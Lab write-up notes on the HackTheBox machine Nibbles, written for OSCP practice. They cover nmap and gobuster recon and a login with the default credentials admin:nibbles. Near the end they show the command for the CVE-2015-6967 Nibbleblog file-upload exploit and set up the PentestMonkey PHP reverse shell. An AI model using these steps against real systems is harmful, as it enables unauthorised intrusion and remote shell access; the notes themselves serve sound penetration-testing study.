
If you have studied PEN200, HTB Academy or TryHackMe's pentest learning paths, Nibbles is a good first machine to attempt in **Lainkusanagi/TJnull** lists

If you are still working on basics, start with LAME (no longer in **Lainkusanagi/TJnull** lists as of 2026) or Legacy/Blue (very easy) and Shocker (Easy)

Nibbles is more challenging than Legacy, Blue and Shocker as it requires you to use more tools. 

Ping test for IP reachability check is important here. 
Good practice to do it before running NMAP. 
Nibbles has an **IP Blacklist** feature. If you run your `gobuster` or `nmap` too fast (too many threads), it might temporarily block your IP. 
You can do ping test to check if that happened. 

## Runbook & Steps

- **Step 1:** Nmap (Recon) - good practice to do ping test 
    
- **Step 2:** Web Discovery (Source code analysis)
    
- **Step 3:** Directory Brute-forcing (Gobuster)
    
- **Step 4:** Exploit (File Upload)
    
- **Step 5:** Stabilization (gaining full interactive shell)
    
- **Step 6:** PrivEsc (Sudo -l and Zip exploitation)


## Hack Smarter

for Apache httpd 2.4.18 ((Ubuntu)) identified in nmap scan, some beginners see an old Apache version and try to find a direct exploit 

While `searchsploit` will show several vulnerabilities for Apache 2.4.18 
(like **CVE-2016-5387 "httpoxy"** or various Denial of Service flaws), none of them lead to the **Remote Code Execution (RCE)** you need for this machine

The concept to grasp here: "**Apache is the Door, not the Key**"
- Apache is simply acting as the web server hosting the real target.
    
- **Actual Target:** A blogging CMS called **Nibbleblog** (where the machine gets its name).
  
- **Admin Bruteforce:** It often requires a very small amount of "password guessing" or using default credentials (`admin:nibbles`), which is a very realistic real-world scenario.
    
3. **Arbitrary File Upload:** Gain access by uploading a malicious PHP shell disguised as a plugin image. This is a "Gold Standard" pentesting skill.
    
4. **Privilege Escalation:** access as a user and find a **zip file** to run as sudo. 
   It teaches us to "deconstruct" how a user has set up their folder permissions.


## Details

┌──(lanc3㉿kali)-[~]
└─$ ping 10.10.10.75    
PING 10.10.10.75 (10.10.10.75) 56(84) bytes of data.
64 bytes from 10.10.10.75: icmp_seq=1 ttl=63 time=169 ms
64 bytes from 10.10.10.75: icmp_seq=2 ttl=63 time=168 ms
64 bytes from 10.10.10.75: icmp_seq=3 ttl=63 time=170 ms
^C
--- 10.10.10.75 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2005ms
rtt min/avg/max/mdev = 167.995/168.942/169.944/0.796 ms
                                                                                                                                                         
┌──(lanc3㉿kali)-[~]
└─$ nmap -sCV -v -p- -T4 10.10.10.75 -oA nmap/nibbles
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-13 12:34 +08
...
Scanning 10.10.10.75 [65535 ports]
Discovered open port 80/tcp on 10.10.10.75
Discovered open port 22/tcp on 10.10.10.75
...
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
**80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))**
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel



browse to http://10.10.10.75:80

![[nibble-hello-world.png|350]]
view-source:http://10.10.10.75/

![[nibble-view-source.png|380]]

**Source Code** of webpage reveals a hidden directory (`/nibbleblog/`).

![[nibbleblog-empty.png|380]]

![[nibbleblog-viewsource.png]]

viewing source doesn't review any nibbleblog version data. 

Out of curiosity, i checked to see if any of the wordlists contain "nibbleblog" and found none

┌──(lanc3㉿kali)-[~]
└─$ cat /usr/share/wordlists/dirb/directory-list-2.3-big.txt | grep nibble    
109nibble

gobuster dir -u http://10.10.10.75 -w /usr/share/wordlists/dirb/common.txt
will NOT reveal /nibbleblog directory 

## Hack Smarter

Nibble is specifically designed to "punish" pentesters who "spray and pray" with large wordlists without performing manual recon first.

The directory name `nibbleblog` is not a "common" web folder (like `/admin`, `/login`, or `/dev`). 
It is the specific name of the CMS software. 

vital lesson: **A larger wordlist is not always a better wordlist.**

- **Small/Common Lists:** Catch the "low-hanging fruit" (standard configs).
    
- **Large/Medium Lists:** Catch generic software names, but take significantly longer.
    
- **Manual Recon:** Catches the "unique" identifiers (like `/nibbleblog/`) in seconds.



### Why `nibbleblog` is missing (from wordlists)

Most wordlists are compiled from "crawling" the web and seeing which directory names appear most frequently. 
While Nibbleblog is a real CMS, it isn't nearly as common as WordPress (`/wp-admin/`) or Joomla (`/administrator/`). 

Therefore, it is not included in "Top 5000" or even "Top 20,000" directories found in the standard lists.


## gobuster sub-directories in nibbleblog
while gobuster won't reveal nibbleblog, it will help find /admin (among others)

when using gobuster , it's important to include flags **-x aspx,html,php,txt**

example:
**gobuster dir -u http://10.10.10.75/nibbleblog -w /usr/share/wordlists/dirb/common.txt --x aspx,html,php,txt**
It would be a noob mistake to forget them and miss out crucial info. 


here's an example where **-x aspx,html,php,txt** was not included

![[gobuster-nibbleblog.png]]

compare it to this version, which reveals a lot more, including the /admin.php login page

![[nibble-gobuster-flags.png]]


## High value directories/files identified 

/admin                (Status: 301) [Size: 321] [--> http://10.10.10.75/nibbleblog/admin/]
/admin.php            (Status: 200) [Size: 1401]
/content              (Status: 301) [Size: 323] [--> http://10.10.10.75/nibbleblog/content/]
/feed.php             (Status: 200) [Size: 302]
/index.php            (Status: 200) [Size: 2987]
/plugins              (Status: 301) [Size: 323] [--> http://10.10.10.75/nibbleblog/plugins/]
/update.php           (Status: 200) [Size: 1622]


![[Screenshot 2026-01-13 at 3.15.45 PM.png|300]]

**Caution:** trying "forget password" will trigger Nibble blacklist protection
![[nibble-blacklist-protection.png|300]]


![[Screenshot 2026-01-13 at 2.56.44 PM.png|300]]

![[Screenshot 2026-01-13 at 2.57.30 PM.png|300]]
## Googling for " Nibble exploit " 
reveals two exploit POC (proof of concept)
first one is a python script
https://github.com/dix0nym/CVE-2015-6967

second one is a metasploit exploit, which I would test for learning purpose. 
https://www.exploit-db.com/exploits/38489

During OSCP exams, you can only use metasploit once, hence use it only as last resort. 






python3 exploit.py --url http://10.10.10.75/nibbleblog/ --username admin --password nibbles --payload shell.php


Kali Linux comes pre-installed with the most famous PHP reverse shell (created by PentestMonkey).

Copy it to current working directory:
```
cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php
```

nano shell.php to include our kali machine IP & listening port

$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
